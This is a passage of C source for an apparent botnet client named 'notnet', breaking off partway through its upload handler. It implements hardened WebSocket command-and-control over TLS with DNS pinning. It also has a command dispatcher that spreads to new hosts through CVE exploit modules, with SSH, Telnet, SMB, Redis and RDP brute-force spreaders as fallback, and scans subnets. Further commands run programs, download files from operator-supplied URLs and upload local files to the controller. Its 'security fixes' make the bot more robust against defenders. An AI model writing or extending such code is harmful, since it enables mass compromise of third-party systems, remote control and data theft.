        uint32_t t = (a << 16) | (b << 8) | c;
        dst[o++] = tbl[(t >> 18) & 0x3F];
        dst[o++] = tbl[(t >> 12) & 0x3F];
        dst[o++] = (i + 1 < len) ? tbl[(t >> 6) & 0x3F] : '=';
        dst[o++] = (i + 2 < len) ? tbl[t & 0x3F] : '=';
        i += 3;
    }
    dst[o] = '\0';
}

/* SHA-1 (FIPS 180-1) — compact single-shot implementation for the
 * RFC 6455 Sec-WebSocket-Accept computation. */
typedef struct { uint32_t h[5]; uint64_t len; uint8_t buf[64]; size_t buflen; } ws_sha1_ctx;

static uint32_t ws_rotl(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }

static void ws_sha1_init(ws_sha1_ctx *c) {
    c->h[0] = 0x67452301; c->h[1] = 0xEFCDAB89; c->h[2] = 0x98BADCFE;
    c->h[3] = 0x10325476; c->h[4] = 0xC3D2E1F0; c->len = 0; c->buflen = 0;
}

static void ws_sha1_block(ws_sha1_ctx *c, const uint8_t *p) {
    uint32_t w[80];
    for (int i = 0; i < 16; i++) {
        w[i] = ((uint32_t)p[i * 4] << 24) | ((uint32_t)p[i * 4 + 1] << 16) |
               ((uint32_t)p[i * 4 + 2] << 8) | p[i * 4 + 3];
    }
    for (int i = 16; i < 80; i++) {
        w[i] = ws_rotl(w[i - 3] ^ w[i - 8] ^ w[i - 14] ^ w[i - 16], 1);
    }
    uint32_t a = c->h[0], b = c->h[1], cc = c->h[2], d = c->h[3], e = c->h[4];
    for (int i = 0; i < 80; i++) {
        uint32_t f, k;
        if (i < 20)      { f = (b & cc) | ((~b) & d); k = 0x5A827999; }
        else if (i < 40) { f = b ^ cc ^ d;            k = 0x6ED9EBA1; }
        else if (i < 60) { f = (b & cc) | (b & d) | (cc & d); k = 0x8F1BBCDC; }
        else             { f = b ^ cc ^ d;            k = 0xCA62C1D6; }
        uint32_t tmp = ws_rotl(a, 5) + f + e + k + w[i];
        e = d; d = cc; cc = ws_rotl(b, 30); b = a; a = tmp;
    }
    c->h[0] += a; c->h[1] += b; c->h[2] += cc; c->h[3] += d; c->h[4] += e;
}

static void ws_sha1_update(ws_sha1_ctx *c, const uint8_t *data, size_t len) {
    c->len += len;
    while (len > 0) {
        size_t take = 64 - c->buflen;
        if (take > len) take = len;
        memcpy(c->buf + c->buflen, data, take);
        c->buflen += take;
        data += take;
        len -= take;
        if (c->buflen == 64) { ws_sha1_block(c, c->buf); c->buflen = 0; }
    }
}

static void ws_sha1_final(ws_sha1_ctx *c, uint8_t out[20]) {
    uint64_t bits = c->len * 8;
    uint8_t pad = 0x80;
    ws_sha1_update(c, &pad, 1);
    uint8_t zero = 0;
    while (c->buflen != 56) ws_sha1_update(c, &zero, 1);
    uint8_t lenb[8];
    for (int i = 0; i < 8; i++) lenb[i] = (bits >> (56 - i * 8)) & 0xFF;
    ws_sha1_update(c, lenb, 8);
    for (int i = 0; i < 5; i++) {
        out[i * 4]     = (c->h[i] >> 24) & 0xFF;
        out[i * 4 + 1] = (c->h[i] >> 16) & 0xFF;
        out[i * 4 + 2] = (c->h[i] >> 8) & 0xFF;
        out[i * 4 + 3] = c->h[i] & 0xFF;
    }
}

/* Compute base64(SHA1(key + RFC6455_GUID)) — the Sec-WebSocket-Accept
 * the server must echo for our handshake key. */
static void ws_compute_accept(const char *key, char *out, int out_size) {
    static const char GUID[] = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";
    ws_sha1_ctx c;
    ws_sha1_init(&c);
    ws_sha1_update(&c, (const uint8_t *)key, strlen(key));
    ws_sha1_update(&c, (const uint8_t *)GUID, strlen(GUID));
    uint8_t digest[20];
    ws_sha1_final(&c, digest);
    ws_base64_encode(digest, 20, out, out_size);
}

int ws_connect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) return 0;
    
    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) return -1;
    
    /* Non-blocking connect */
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(bot->c2_ws.port);
    
    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
     * gethostbyname + memcpy (h_length overflow on IPv6 results). */
    if (inet_pton(AF_INET, bot->c2_ws.server, &addr.sin_addr) != 1) {
        addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_ws.server);
        if (addr.sin_addr.s_addr == INADDR_NONE) {
            close(sock);
            return -1;
        }
    }
    
    /* SECURITY FIX (#10): DNS pinning for WebSocket C2 */
    if (bot->c2_ws.dns_pinned && addr.sin_addr.s_addr != bot->c2_ws.pinned_addr.s_addr) {
        log_warn("WS: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                 inet_ntoa(bot->c2_ws.pinned_addr), inet_ntoa(addr.sin_addr));
        close(sock);
        return -1;
    }
    
    int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
    if (connect_err < 0 && errno != EINPROGRESS) {
        close(sock);
        return -1;
    }
    
    /* Wait with 3s timeout */
    fd_set fds;
    struct timeval tv;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    
    if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
        close(sock);
        return -1;
    }
    
    int so_error;
    socklen_t len = sizeof(so_error);
    getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
    if (so_error != 0) {
        close(sock);
        return -1;
    }

    /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured.
     * Must happen BEFORE the RFC 6455 handshake so the upgrade request and
     * 101 response ride inside the encrypted tunnel. */
    if (tls_setup(&bot->c2_ws.tls, sock, bot->c2_ws.server,
                  bot->tls_cert_pin_sha256) != 0) {
        close(sock);
        return -1;
    }

    /* SECURITY FIX (#46): Perform the RFC 6455 client handshake.
     * Raw TCP connect is not enough — the server must respond with
     * HTTP 101 Switching Protocols and a valid Sec-WebSocket-Accept
     * (base64(SHA1(key + GUID))). Without the handshake a real
     * WebSocket endpoint rejects the masked frames ws_send() emits. */

    /* Sec-WebSocket-Key: base64 of 16 cryptographically-random bytes */
    uint8_t key_raw[16];
    if (random_bytes(key_raw, sizeof(key_raw)) != 0) {
        log_warn("WS: getrandom failed for handshake key");
        close(sock);
        return -1;
    }
    char ws_key[32];
    ws_base64_encode(key_raw, sizeof(key_raw), ws_key, sizeof(ws_key));

    char upgrade_req[2048];
    int req_len = snprintf(upgrade_req, sizeof(upgrade_req),
             "GET %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "Upgrade: websocket\r\n"
             "Connection: Upgrade\r\n"
             "Sec-WebSocket-Key: %s\r\n"
             "Sec-WebSocket-Version: 13\r\n"
             "\r\n",
             bot->c2_ws.path, bot->c2_ws.server, bot->c2_ws.port, ws_key);
    if (req_len < 0 || req_len >= (int)sizeof(upgrade_req)) {
        log_warn("WS: upgrade request too large");
        close(sock);
        return -1;
    }

    int sent = chan_send(&bot->c2_ws.tls, sock, upgrade_req, req_len);
    if (sent != req_len) {
        log_warn("WS: upgrade request send failed: %s", strerror(errno));
        close(sock);
        return -1;
    }

    /* Read the 101 response headers (5s timeout, bounded loop). */
    char response[1024] = {0};
    int received = 0;
    while (received < (int)sizeof(response) - 1) {
        fd_set rfd;
        struct timeval tv;
        FD_ZERO(&rfd);
        FD_SET(sock, &rfd);
        tv.tv_sec = 5;
        tv.tv_usec = 0;
        if (select(sock + 1, &rfd, NULL, NULL, &tv) <= 0) {
            log_warn("WS: upgrade response timed out");
            close(sock);
            return -1;
        }
        int r = chan_recv(&bot->c2_ws.tls, sock, response + received, sizeof(response) - received - 1);
        if (r <= 0) break;
        received += r;
        response[received] = '\0';
        /* Stop once the header terminator arrives */
        if (strstr(response, "\r\n\r\n")) break;
    }
    response[received] = '\0';

    /* Verify the status line is exactly "HTTP/1.1 101" (start-of-line match,
     * not a substring scan that could match "101" inside an error body). */
    if (strncmp(response, "HTTP/1.1 101", 12) != 0 &&
        strncmp(response, "HTTP/1.0 101", 12) != 0) {
        log_warn("WS: no 101 Switching Protocols received — handshake failed (%.80s)",
                 response[0] ? response : "(empty response)");
        close(sock);
        return -1;
    }

    /* Verify Sec-WebSocket-Accept header matches base64(SHA1(key+GUID)) */
    char expect[64];
    ws_compute_accept(ws_key, expect, sizeof(expect));
    char *accept_hdr = strstr(response, "Sec-WebSocket-Accept:");
    int accept_ok = 0;
    if (accept_hdr) {
        char *val = accept_hdr + strlen("Sec-WebSocket-Accept:");
        while (*val == ' ' || *val == '\t') val++;
        char got[64];
        int i = 0;
        while (val[i] && val[i] != '\r' && val[i] != '\n' && i < (int)sizeof(got) - 1) {
            got[i] = val[i];
            i++;
        }
        got[i] = '\0';
        if (strcmp(got, expect) == 0) {
            accept_ok = 1;
        } else {
            log_warn("WS: Sec-WebSocket-Accept mismatch (got '%s', expected '%s')",
                     got, expect);
        }
    } else {
        log_warn("WS: missing Sec-WebSocket-Accept header");
    }
    if (!accept_ok) {
        close(sock);
        return -1;
    }
    log_info("WS: RFC 6455 handshake complete (%s)", expect);

    fcntl(sock, F_SETFL, flags);
    
    bot->c2_ws.sock = sock;
    bot->c2_ws.connected = 1;
    /* SECURITY FIX (#10): Pin IP on first successful WS connection */
    if (!bot->c2_ws.dns_pinned) {
        struct sockaddr_in sin;
        socklen_t slen = sizeof(sin);
        getpeername(sock, (struct sockaddr *)&sin, &slen);
        bot->c2_ws.pinned_addr = sin.sin_addr;
        bot->c2_ws.dns_pinned = 1;
    }
    log_info("WS: connected to %s:%d", bot->c2_ws.server, bot->c2_ws.port);
    
    return 0;
}

/* ── WebSocket Protocol Helpers ───────────────────────────────── */
/* SECURITY FIX (#22): Implement proper RFC 6455 WebSocket framing.
 * Previously ws_send/ws_read sent/received raw data without frame headers. */

/* Generate a random 4-byte masking key for client-to-server frames */
static void ws_make_mask(uint8_t *mask) {
    /* SECURITY FIX (#37): Use getrandom() — a predictable mask lets an
     * on-path observer unmask/forge C2 frames. */
    if (random_bytes(mask, 4) != 0) {
        mask[0] = rand() & 0xFF;
        mask[1] = rand() & 0xFF;
        mask[2] = rand() & 0xFF;
        mask[3] = rand() & 0xFF;
    }
}

/* Apply WebSocket mask to payload data in-place */
static void ws_apply_mask(uint8_t *data, size_t len, const uint8_t *mask) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= mask[i % 4];
    }
}

int ws_send(notnet_bot_t *bot, const char *data, int len) {
    if (!bot->c2_ws.connected) return -1;

    /* Build RFC 6455 frame:
     * Byte 0: FIN(1) + RSV(0) + Opcode(1=text)
     * Byte 1: MASK(1, client must mask) + Payload len(7)
     * Then: 4-byte mask key
     * Then: masked payload */
    uint8_t header[14];  /* max header size for 64-bit payload length */
    int hdr_len = 0;

    /* FIN bit set + opcode 1 (text frame) */
    header[hdr_len++] = 0x81;

    /* Masking bit set (client-to-server) */
    uint8_t mask[4];
    ws_make_mask(mask);

    if (len < 126) {
        header[hdr_len++] = 0x80 | (uint8_t)len;
    } else if (len < 65536) {
        header[hdr_len++] = 0x80 | 126;
        header[hdr_len++] = (len >> 8) & 0xFF;
        header[hdr_len++] = len & 0xFF;
    } else {
        header[hdr_len++] = 0x80 | 127;
        for (int i = 7; i >= 0; i--) {
            header[hdr_len++] = (len >> (i * 8)) & 0xFF;
        }
    }

    /* Append mask key */
    memcpy(header + hdr_len, mask, 4);
    hdr_len += 4;

    /* Copy data to a temp buffer for masking */
    /* SECURITY FIX (#25): Use dynamic allocation for masked payload to
     * avoid silent truncation of messages > 2048 bytes. */
    int send_len = len;
    char *masked = (char *)malloc(send_len);
    if (!masked) {
        log_error("ws_send: malloc failed for %d bytes", send_len);
        return -1;
    }
    memcpy(masked, data, send_len);
    ws_apply_mask((uint8_t *)masked, send_len, mask);

    /* Send header + masked payload */
    int hdr_sent = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)header, hdr_len);
    if (hdr_sent < 0) {
        log_warn("ws_send: header send failed: %s", strerror(errno));
        free(masked);
        return -1;
    }
    int result = chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, masked, send_len);
    free(masked);
    return result;
}

int ws_read(notnet_bot_t *bot, char *buf, int len) {
    if (!bot->c2_ws.connected) return -1;

    if (tls_pending(&bot->c2_ws.tls) <= 0) {
        fd_set fds;
        struct timeval tv;
        FD_ZERO(&fds);
        FD_SET(bot->c2_ws.sock, &fds);
        tv.tv_sec = 0;
        tv.tv_usec = 0;

        if (select(bot->c2_ws.sock + 1, &fds, NULL, NULL, &tv) <= 0) return 0;
    }

    /* SECURITY FIX (#40): read the full 2-byte frame header. A single
     * recv() can return 1 byte (partial read) — frame_hdr[1] would stay
     * uninitialized and the opcode/length parse below would use garbage. */
    uint8_t frame_hdr[2] = {0, 0};
    size_t hdr_got = 0;
    while (hdr_got < sizeof(frame_hdr)) {
        ssize_t r = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)frame_hdr + hdr_got, sizeof(frame_hdr) - hdr_got);
        if (r <= 0) {
            bot->c2_ws.connected = 0;
            if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
            bot->c2_ws.sock = -1;
            return -1;
        }
        hdr_got += (size_t)r;
    }

    int fin = (frame_hdr[0] & 0x80) >> 7;
    int opcode = frame_hdr[0] & 0x0F;
    (void)fin;  /* FIN bit: not checking fragmentation (C2 messages are small) */
    int masked = (frame_hdr[1] & 0x80) >> 7;
    uint8_t payload_len = frame_hdr[1] & 0x7F;

    /* Determine actual payload length */
    int plen = payload_len;
    if (plen == 126) {
        uint8_t ext[2] = {0};
        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 2) != 2) return -1;
        plen = (ext[0] << 8) | ext[1];
    } else if (plen == 127) {
        uint8_t ext[8] = {0};
        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)ext, 8) != 8) return -1;
        plen = 0;
        for (int i = 0; i < 8; i++) {
            plen = (plen << 8) | ext[i];
        }
    }

    /* Read mask key if present (server-to-client frames are unmasked,
     * but we handle both cases) */
    uint8_t mask[4] = {0};
    if (masked) {
        if (chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)mask, 4) != 4) return -1;
    }

    /* Read payload */
    if (plen > len - 1) plen = len - 1;
    int total = 0;
    while (total < plen) {
        int n = chan_recv(&bot->c2_ws.tls, bot->c2_ws.sock, buf + total, plen - total);
        if (n <= 0) break;
        total += n;
    }

    if (total <= 0) return -1;

    /* Unmask if needed */
    if (masked) {
        for (int i = 0; i < total; i++) {
            buf[i] ^= mask[i % 4];
        }
    }

    /* Handle control frames (close, ping, pong) by returning 0 */
    if (opcode == 0x8 || opcode == 0x9 || opcode == 0xA) {
        if (opcode == 0x8) {
            /* Close frame - send close frame back and disconnect */
            uint8_t close_frame[] = { 0x88, 0x00 };
            chan_send(&bot->c2_ws.tls, bot->c2_ws.sock, (char *)close_frame, 2);
        }
        return 0;
    }

    buf[total] = '\0';
    return total;
}

void ws_disconnect(notnet_bot_t *bot) {
    if (bot->c2_ws.connected) {
        bot->c2_ws.connected = 0;
        if (bot->c2_ws.sock >= 0) {
            tls_close(&bot->c2_ws.tls);
            close(bot->c2_ws.sock);
            bot->c2_ws.sock = -1;
        }
        log_info("WS: disconnected");
    }
}

/* ── Core Protocol ──────────────────────────────────────────── */
int protocol_connect_all(notnet_bot_t *bot) {
    /* Try IRC first (fast, lightweight) */
    if (bot->c2_enabled & C2_IRC) {
        if (!bot->c2_irc.connected) {
            if (irc_connect(bot) == 0) {
                irc_send(bot, "JOIN %s", bot->c2_irc.channel);
                bot->c2_irc.joined = 0;
            }
        } else if (!bot->c2_irc.joined && bot->c2_irc.authenticated) {
            /* Send JOIN once after authentication */
            irc_send(bot, "JOIN %s", bot->c2_irc.channel);
            bot->c2_irc.joined = 1;
            log_info("IRC: sent JOIN %s", bot->c2_irc.channel);
        }
    }
    
    /* Try HTTP if IRC fails */
    if (bot->c2_enabled & C2_HTTP) {
        if (!bot->c2_http.connected) {
            http_connect(bot);
        }
    }
    
    /* Try WebSocket as backup */
    if (bot->c2_enabled & C2_WS) {
        if (!bot->c2_ws.connected) {
            ws_connect(bot);
        }
    }
    
    return 0;
}

int protocol_process_commands(notnet_bot_t *bot) {
    /* SECURITY FIX (#9): Use separate buffers per channel to prevent
     * one channel's read from overwriting another's queued command. */
    char irc_buf[1024];
    char http_buf[1024];
    char ws_buf[1024];
    
    /* Check IRC - always read when connected, auth may not be set yet */
    if (bot->c2_irc.connected) {
        int result = irc_read(bot, irc_buf, sizeof(irc_buf));
        if (result == 1) {
            /* New command in buffer - add to queue */
            if (bot->cmd_count < 256 && bot->c2_irc.authenticated) {
                snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", irc_buf);
                bot->cmd_count++;
            }
        }
    }
    
    /* Check HTTP - read responses for queued commands */
    if (bot->c2_http.connected) {
        memset(http_buf, 0, sizeof(http_buf));
        int result = http_read(bot, http_buf, sizeof(http_buf));
        if (result > 0) {
            log_info("HTTP: http_read returned %d bytes", result);
            /* SECURITY FIX (#24): Skip HTTP headers before parsing JSON.
             * Headers may contain "cmd" in unexpected places. */
            char *body = strstr(http_buf, "\r\n\r\n");
            if (body) body += 4;
            else body = http_buf;
            /* SECURITY FIX (#35): Auth gate — only trust command JSON
             * that echoes our shared secret. HTTP previously queued any
             * command found in the response with no authentication
             * (CWE-306), unlike the IRC nick allowlist. */
            if (!http_body_has_secret(bot, body)) {
                log_warn("HTTP: command rejected — response did not echo shared secret");
            } else {
            /* Parse JSON command from response body only */
            char *cmd_key = strstr(body, "\"cmd\"");
            if (cmd_key) {
                char cmd[128];
                snprintf(cmd, sizeof(cmd), "%s", cmd_key + 6);
                /* Extract value between quotes */
                char *start = strchr(cmd, '"');
                char *end = start ? strchr(start + 1, '"') : NULL;
                if (start && end && end > start) {
                    int clen = end - start - 1;
                    if (clen > 0 && clen < 254 && bot->cmd_count < 256) {
                        memset(bot->cmd_queue[bot->cmd_count], 0, 256);
                        strncpy(bot->cmd_queue[bot->cmd_count], start + 1, clen);
                        bot->cmd_queue[bot->cmd_count][clen] = '\0';
                        /* Extract args value and append to command */
                        char *args_key = strstr(body, "\"args\"");
                        if (args_key) {
                            /* Find colon after "args" (6 chars), then skip to opening quote of value */
                            char *colon = strchr(args_key + 6, ':');
                            char *args_val = NULL;
                            if (colon) {
                                args_val = strchr(colon + 1, '\"');
                            }
                            if (args_val) {
                                char *args_end = strchr(args_val + 1, '\"');
                                if (args_end && args_end > args_val) {
                                    int alen = args_end - args_val - 1;
                                    if (alen > 0 && clen + 1 + alen < 255) {
                                        /* BUGFIX: alen bounds the copy. The old
                                         * code did snprintf(combined, "%s %s",
                                         * queue, args_val+1) which copied UNBOUNDED
                                         * from args_val+1 to the end of the buffer,
                                         * swallowing any trailing JSON fields
                                         * (e.g. ", "secret": "..."") into the
                                         * command. Copy exactly alen bytes. */
                                        char combined[256];
                                        memcpy(combined, bot->cmd_queue[bot->cmd_count], clen);
                                        combined[clen] = ' ';
                                        memcpy(combined + clen + 1, args_val + 1, alen);
                                        combined[clen + 1 + alen] = '\0';
                                        snprintf(bot->cmd_queue[bot->cmd_count], 256,
                                                 "%.255s", combined);
                                    }
                                }
                            }
                        }
                        bot->cmd_count++;
                        log_info("HTTP: command: %s", bot->cmd_queue[bot->cmd_count - 1]);
                    }
                }
            }
            } /* end else (secret verified) */
        }
    }
    
    /* Check WebSocket */
    if (bot->c2_ws.connected) {
        int result = ws_read(bot, ws_buf, sizeof(ws_buf));
        if (result > 0) {
            /* SECURITY FIX (#35): Same auth gate as HTTP — only trust
             * frames that echo the shared secret. */
            if (http_body_has_secret(bot, ws_buf)) {
                if (bot->cmd_count < 256) {
                    snprintf(bot->cmd_queue[bot->cmd_count], 256, "%.255s", ws_buf);
                    bot->cmd_count++;
                }
            } else {
                log_warn("WS: command rejected — frame did not echo shared secret");
            }
        }
    }
    
    /* Process queued commands */
    /* SECURITY FIX (#14): Rate limit - max 10 commands per second */
    time_t now = time(NULL);
    if (now != bot->last_cmd_time) {
        bot->last_cmd_time = now;
        bot->cmd_this_second = 0;
    }
    /* SECURITY FIX (#27): Process up to 10 commands per second, skip excess.
     * Previously: if rate limit hit, ALL commands dropped (cmd_count=0).
     * Now: process up to 10, skip the rest, preserving unprocessed commands. */
    int skipped = 0;

    for (int i = 0; i < bot->cmd_count; i++) {
        char *cmd = bot->cmd_queue[i];
        if (bot->cmd_this_second >= 10) {
            log_warn("CMD: rate limit exceeded, skipping command %d", i);
            skipped++;
            continue;
        }
        bot->cmd_this_second++;
        
        if (strncmp(cmd, CMD_SPREAD, strlen(CMD_SPREAD)) == 0) {
            char *args = cmd + strlen(CMD_SPREAD);
            while (*args == ' ' || *args == '\t') args++;
            /* Parse target:port */
            char host[256] = {0};
            uint16_t port = 0;
            if (sscanf(args, "%255[^:]:%hu", host, &port) == 2) {
                log_info("CMD: spread %s:%d", host, port);
                int spread_ok = -1;
                /* #83: CVE-first — known-CVE modules are the primary
                 * vector; brute-force spreaders run only as fallback. */
                if (cve_run_modules(bot, host, port) == 0) {
                    spread_ok = 0;
                } else {
                    switch (port) {
                        case 22:  spread_ok = spread_ssh(bot, host, port); break;
                        case 23:  spread_ok = spread_telnet(bot, host, port); break;
                        case 445: spread_ok = spread_smb(bot, host, port); break;
                        case 6379: spread_ok = spread_redis(bot, host, port); break;
                        case 3389: spread_ok = spread_rdp(bot, host, port); break;
                        default: log_info("CMD: spread unknown port %d", port); break;
                    }
                }
                if (spread_ok == 0) {
                    bot->scan_count++;
                }
            } else {
                log_info("CMD: spread invalid format, use target:port");
            }
        } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
            /* SECURITY FIX (#68/#79): Implement scan. Syntax:
             *   scan <subnet>            -> scan subnet (e.g. 192.168.1.0/24)
             *   scan <ip>:<port,...>     -> scan specific ports on one IP
             *   scan <ip>                -> scan default ports on one IP
             * Results are returned via protocol_send_response(). */
            char *args = cmd + strlen(CMD_SCAN);
            while (*args == ' ' || *args == '\t') args++;

            if (args[0] == '\0') {
                protocol_send_response(bot, CMD_SCAN,
                    "scan: usage 'scan <subnet>' or 'scan <ip>[:<port,...>]'");
            } else if (strchr(args, '/')) {
                /* Subnet scan using the configured service mask */
                uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
                if (scan_subnet(bot, args, all_services) == 0) {
                    protocol_send_response(bot, CMD_SCAN, "scan: subnet complete");
                } else {
                    protocol_send_response(bot, CMD_SCAN, "scan: invalid subnet");
                }
            } else {
                /* Single IP: optional explicit port list, else defaults */
                static const uint16_t default_ports[] = { 22, 23, 445, 6379, 3389 };
                char *ports_str = strchr(args, ':');
                uint16_t ports[16];
                int port_count = 0;
                char target_ip[64] = {0};

                if (ports_str) {
                    int ilen = (int)(ports_str - args);
                    if (ilen > 63) ilen = 63;
                    memcpy(target_ip, args, ilen);
                    target_ip[ilen] = '\0';
                    /* parse comma-separated ports */
                    char *saveptr = NULL;
                    char *tok = strtok_r(ports_str + 1, ",", &saveptr);
                    while (tok && port_count < 16) {
                        int p = atoi(tok);
                        if (p > 0 && p <= 65535) ports[port_count++] = (uint16_t)p;
                        tok = strtok_r(NULL, ",", &saveptr);
                    }
                    if (port_count == 0) {
                        protocol_send_response(bot, CMD_SCAN, "scan: no valid ports");
                        continue;
                    }
                } else {
                    snprintf(target_ip, sizeof(target_ip), "%.63s", args);
                    port_count = (int)(sizeof(default_ports) / sizeof(default_ports[0]));
                    memcpy(ports, default_ports, sizeof(default_ports));
                }

                char *result = scan_ports(target_ip, ports, port_count);
                if (result) {
                    protocol_send_response(bot, CMD_SCAN, result);
                    free(result);
                } else {
                    protocol_send_response(bot, CMD_SCAN, "scan: error");
                }
            }
        } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
            /* SECURITY: exec replaced popen() with a strict allowlist + execve().
             * Only commands in the allowlist are permitted. The command name
             * and single argument are tokenized by whitespace into fixed-size
             * argv. No shell is ever invoked. */
            char *args = cmd + strlen(CMD_EXEC);
            while (*args == ' ' || *args == '\t') args++;

            /* Allowlist of permitted commands */
            static const char *allowlist[] = {
                "uname", "date", "uptime", "whoami", "id", "ls",
                "ifconfig", "hostname", "netstat", "ps", NULL
            };
            char cmd_name[64];
            char arg1[256];
            cmd_name[0] = arg1[0] = '\0';

            /* Parse up to one token as the command name */
            if (sscanf(args, "%63s", cmd_name) != 1) {
                log_warn("CMD: exec rejected (no command)");
                protocol_send_response(bot, CMD_EXEC, "exec rejected: no command");
                continue;
            }

            /* Check allowlist */
            int allowed = 0;
            for (int a = 0; allowlist[a]; a++) {
                if (strcmp(cmd_name, allowlist[a]) == 0) {
                    allowed = 1;
                    break;
                }
            }
            if (!allowed) {
                log_warn("CMD: exec rejected (not in allowlist): %s", cmd_name);
                protocol_send_response(bot, CMD_EXEC, "exec rejected: command not allowed");
                continue;
            }

            /* Optional single argument (e.g. "uname -a") */
            char *sp = args + strlen(cmd_name);
            while (*sp == ' ' || *sp == '\t') sp++;
            if (*sp) {
                snprintf(arg1, sizeof(arg1), "%255s", sp);
            }

            log_info("CMD: exec: allowlist hit: %s %s", cmd_name, arg1);

            char output[1024] = {0};
            int pipefd[2];
            if (pipe(pipefd) < 0) {
                log_error("CMD: exec pipe failed: %s", strerror(errno));
                protocol_send_response(bot, CMD_EXEC, "exec failed: pipe error");
                continue;
            }

            pid_t pid = fork();
            if (pid < 0) {
                close(pipefd[0]);
                close(pipefd[1]);
                log_error("CMD: exec fork failed: %s", strerror(errno));
                protocol_send_response(bot, CMD_EXEC, "exec failed: fork error");
                continue;
            }

            if (pid == 0) {
                /* Child: close read end, redirect stdout to pipe, exec */
                /* SECURITY FIX (#30): Close C2 sockets in child before exec
                 * to prevent the child process from inheriting sensitive
                 * file descriptors (IRC/HTTP/WS sockets). */
                if (bot->c2_irc.sock >= 0) close(bot->c2_irc.sock);
                if (bot->c2_http.sock >= 0) close(bot->c2_http.sock);
                if (bot->c2_ws.sock >= 0) close(bot->c2_ws.sock);
                close(pipefd[0]);
                dup2(pipefd[1], STDOUT_FILENO);
                /* Also redirect stderr to stdout to capture all output */
                dup2(pipefd[1], STDERR_FILENO);
                close(pipefd[1]);

                char *argv[] = { cmd_name, arg1[0] ? arg1 : NULL, NULL };
                execvp(cmd_name, argv);
                _exit(127);
            }

            /* Parent: read output, wait for child */
            close(pipefd[1]);
            size_t n = 0;
            int status;
            while (n < sizeof(output) - 1) {
                ssize_t r = read(pipefd[0], output + n, sizeof(output) - 1 - n);
                if (r <= 0) break;
                n += (size_t)r;
            }
            close(pipefd[0]);
            output[n] = '\0';
            waitpid(pid, &status, 0);

            int exit_code = -1;
            if (WIFEXITED(status)) {
                exit_code = WEXITSTATUS(status);
            } else if (WIFSIGNALED(status)) {
                log_warn("CMD: exec killed by signal %d", WTERMSIG(status));
            }
            log_info("CMD: exec output (%zu bytes, exit %d)", n, exit_code);
            protocol_send_response(bot, CMD_EXEC, output);
        } else if (strncmp(cmd, CMD_DOWNLOAD, strlen(CMD_DOWNLOAD)) == 0) {
            /* SECURITY FIX (#66): Actually fetch the URL and write to the
             * requested path. Syntax: download <url> <path>.
             * Path is validated against shell metacharacters — the file
             * is written with fopen(), never passed to a shell. */
            char *args = cmd + strlen(CMD_DOWNLOAD);
            while (*args == ' ' || *args == '\t') args++;

            char url[1024] = {0};
            char dest[512] = {0};

            char *sp = strchr(args, ' ');
            if (sp) {
                int ulen = (int)(sp - args);
                if (ulen > 1000) ulen = 1000;
                memcpy(url, args, ulen);
                url[ulen] = '\0';
                char *dp = sp + 1;
                while (*dp == ' ' || *dp == '\t') dp++;
                snprintf(dest, sizeof(dest), "%.500s", dp);
            } else {
                snprintf(url, sizeof(url), "%.1000s", args);
                snprintf(dest, sizeof(dest), "/tmp/.notnet.download");
            }

            if (url[0] == '\0') {
                protocol_send_response(bot, CMD_DOWNLOAD,
                    "download: usage 'download <url> [path]'");
            } else if (strncmp(url, "http://", 7) != 0 && strncmp(url, "https://", 8) != 0) {
                protocol_send_response(bot, CMD_DOWNLOAD,
                    "download: url must start with http:// or https://");
            } else if (strpbrk(dest, ";|&`$(){}[]<>!\n\r")) {
                protocol_send_response(bot, CMD_DOWNLOAD,
                    "download: path rejected (dangerous character)");
            } else {
                int got = http_download(bot, url, dest);
                if (got > 0) {
                    char resp[512];
                    snprintf(resp, sizeof(resp), "download ok: %d bytes to %s", got, dest);
                    protocol_send_response(bot, CMD_DOWNLOAD, resp);
                } else {
                    protocol_send_response(bot, CMD_DOWNLOAD, "download failed");
                }
            }
        } else if (strncmp(cmd, CMD_UPLOAD, strlen(CMD_UPLOAD)) == 0) {
            /* Parse: upload <local_path> [remote_path] */
            char *args = cmd + strlen(CMD_UPLOAD);
            while (*args == ' ' || *args == '\t') args++;

            char local_path[512] = {0};
            char remote_path[512] = {0};

            /* Parse local path (first arg, up to space) */
            char *space = strchr(args, ' ');
            if (space) {
                int len = space - args;
                if (len > 511) len = 511;
                memcpy(local_path, args, len);
                local_path[len] = '\0';

                /* Parse remote path (optional second arg) */
                char *rem = space + 1;
                while (*rem == ' ' || *rem == '\t') rem++;
                if (*rem) {
                    strncpy(remote_path, rem, 511);
                    remote_path[511] = '\0';
                }
            } else {
                /* No space — entire arg is local path, use default remote */
                strncpy(local_path, args, 511);
                local_path[511] = '\0';
            }

            /* Validate local path */
            const char *bad = strpbrk(local_path, ";|&`$(){}[]<>!");
            if (bad) {
